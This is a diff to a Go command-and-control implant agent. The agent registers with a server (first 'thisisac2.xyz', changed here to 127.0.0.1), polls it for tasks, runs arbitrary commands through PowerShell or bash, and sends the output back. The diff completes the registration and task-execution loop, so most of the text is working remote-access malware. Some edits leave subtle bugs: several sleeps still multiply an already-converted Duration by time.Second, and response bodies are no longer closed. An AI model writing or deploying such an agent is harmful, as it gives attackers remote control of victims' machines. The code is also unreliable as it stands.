@@ -13,18 +13,18 @@ import (
 )
 
 type Agent struct {
-    LocalIP  string
-    ServerIP string
-    ServerPort int
-	CallbackInterval int
-	Client *http.Client
+    LocalIP       string
+    ServerIP     string
+    ServerPort    int
+	CallbackInterval time.Duration
+	Client        *http.Client
 }
 
 type Task struct {
 	Action string `json:"action"`
 	Command string `json:"command"`
 	Filename string `json:"filename"`
-	TaskID string `json:"task_id"`
+	TaskID json.Number `json:"task_id"`
 }
 
 type Result struct {
@@ -68,20 +68,38 @@ func (agent *Agent) Register() error {
     if err != nil {
         return fmt.Errorf("failed to marshal JSON: %w", err)
     }
-	return nil
+
+    req, err := http.NewRequest("POST", fmt.Sprintf("http://%s:%d/register", agent.ServerIP, agent.ServerPort), bytes.NewBuffer(jsonData))
+    if err != nil {
+        return fmt.Errorf("failed to create request: %w", err)
+    }
+    req.Header.Set("Content-Type", "application/json")
+
+    resp, err := agent.Client.Do(req)
+    if err != nil {
+        return fmt.Errorf("failed to send request: %w", err)
+    }
+    defer resp.Body.Close()
+
+    if resp.StatusCode != 201 && resp.StatusCode != 200 {
+        return fmt.Errorf("unexpected status code: %d", resp.StatusCode)
+    }
+
+    return nil
 }
 
 func (agent *Agent) HandleTask(task Task) (Result, error) {
 	var result Result
 	result.AgentID = agent.LocalIP
-	result.TaskID = task.TaskID
+	result.TaskID = task.TaskID.String()
 
 	switch task.Action {
 	case "command":
+		var cmd *exec.Cmd
 		if runtime.GOOS == "windows" {
-			cmd := exec.Command("powershell", "-Command", task.Command)
+			cmd = exec.Command("powershell", "-Command", task.Command)
 		} else {
-			cmd := exec.Command("bash", "-c", task.Command)
+			cmd = exec.Command("bash", "-c", task.Command)
 		}
 		out, err := cmd.CombinedOutput()
 		if err != nil {
@@ -101,9 +119,9 @@ func (agent *Agent) HandleTask(task Task) (Result, error) {
 func main(){
 	agent := Agent{
         LocalIP:  getLocalIP(),
-        ServerIP: "thisisac2.xyz",
-        Port:     80,
-		CallbackInterval: 60,
+        ServerIP: "127.0.0.1",
+        ServerPort: 80,
+		CallbackInterval: 60 * time.Second,
 		Client: &http.Client{
             Timeout: 10 * time.Second,
         },
@@ -141,8 +159,7 @@ func main(){
 			time.Sleep(agent.CallbackInterval * time.Second)
 			continue
 		}
-		io.Copy(io.Discard, resp.Body) // drain the body
-		resp.Body.Close() 
+		
 
 		if resp.StatusCode == 418 {
             agent.Register()
@@ -151,15 +168,53 @@ func main(){
 
         if resp.StatusCode != 200 && resp.StatusCode != 201 && resp.StatusCode != 204 {
             fmt.Printf("Unexpected status code: %d\n", resp.StatusCode)
-            time.Sleep(agent.CallbackInterval * time.Second)
+            time.Sleep(agent.CallbackInterval)
             continue
-        }
-        else if resp.StatusCode == 204 {
+        } else if resp.StatusCode == 204 {
             // No tasks
-            time.Sleep(agent.CallbackInterval * time.Second)
+            time.Sleep(agent.CallbackInterval)
             continue
         }
 
 		// NOW MUST ADD CODE TO HANDLE TASKS
+		var task Task
+		err = json.NewDecoder(resp.Body).Decode(&task)
+		if err != nil {
+			fmt.Println("Error decoding JSON:", err)
+			time.Sleep(agent.CallbackInterval * time.Second)
+			continue
+		}
+		result, err := agent.HandleTask(task)
+		if err != nil {
+			fmt.Println("Error handling task:", err)
+			time.Sleep(agent.CallbackInterval * time.Second)
+			continue
+		}
+		// Send the result back to the server
+		url = fmt.Sprintf("http://%s:%d/results", agent.ServerIP, agent.ServerPort)
+		jsonData, err = json.Marshal(result)
+		if err != nil {
+			fmt.Println("Error marshaling JSON:", err)
+			time.Sleep(agent.CallbackInterval * time.Second)
+			continue
+		}
+		req, err = http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
+		if err != nil {
+			fmt.Println("Error creating request:", err)
+			time.Sleep(agent.CallbackInterval * time.Second)
+			continue
+		}
+		req.Header.Set("Content-Type", "application/json")
+		resp, err = agent.Client.Do(req)
+		if err != nil {
+			fmt.Println("Error sending request:", err)
+			time.Sleep(agent.CallbackInterval * time.Second)
+			continue
+		}
+		if resp.StatusCode != 200 && resp.StatusCode != 201 && resp.StatusCode != 204 {
+			fmt.Printf("Unexpected status code: %d\n", resp.StatusCode)
+			time.Sleep(agent.CallbackInterval * time.Second)
+			continue
+		}
 	}
 }
